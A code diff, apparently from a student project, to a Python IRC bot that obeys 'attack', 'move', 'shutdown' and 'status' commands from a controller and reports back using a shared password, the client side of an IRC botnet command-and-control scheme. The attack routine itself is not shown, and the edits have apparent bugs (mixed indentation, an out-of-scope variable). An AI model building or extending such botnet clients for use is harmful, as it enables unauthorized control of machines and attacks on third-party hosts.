@@ -66,13 +66,15 @@ def listen(s):
                 elif msg[1] == "attack":
                     attack(msg[2], msg[3])
                 elif msg[1] == "move":
+					clientNick = prefix.split("!")
+                    print(clientNick[0])
                     break
                 elif msg[1] == "shutdown":
                     shutdown()
 
        print(rec)
 
-    move(msg[2], msg[3], msg[4])
+    move(msg[2], msg[3], msg[4], clientNick)
 
 
 #from carlos' twitch IRC bot, idk if it works with other IRCs
@@ -100,7 +102,7 @@ def parsemsg(s):
 
 def status(clinetNick,s):
 
-    msg = "PRIVMSG "+clinetNick+" :Hi\r\n"
+    msg = "PRIVMSG "+clinetNick+" :" +PASS + "status "+botName+"\r\n"
     print(msg)
     s.send(msg.encode('utf-8'))
     #private message controller
@@ -119,7 +121,9 @@ def attack(atkhost, atkport):
 
     #report back to controller
 
-def move(newhost, newport, newchan):
+def move(newhost, newport, newchan, clientNick):
+	reportmsg = "PRIVMSG %s %s moved" % (clientNick, PASS)
+	s.send(reportmsg.encode('utf-8'))
     success = False
     s.send(("QUIT").encode('utf-8'))
     s.close()
@@ -139,6 +143,7 @@ def move(newhost, newport, newchan):
         s2.connect((HOST, PORT))
     except:
         print("failed to move to new channel")  # we may want to handle a few more specific errors, this is general for now
+		sys.exit(1)
 
         #join IRC
     usr = "USER %s %s %s :%s\r\n" % (botName, botName, botName, botName)
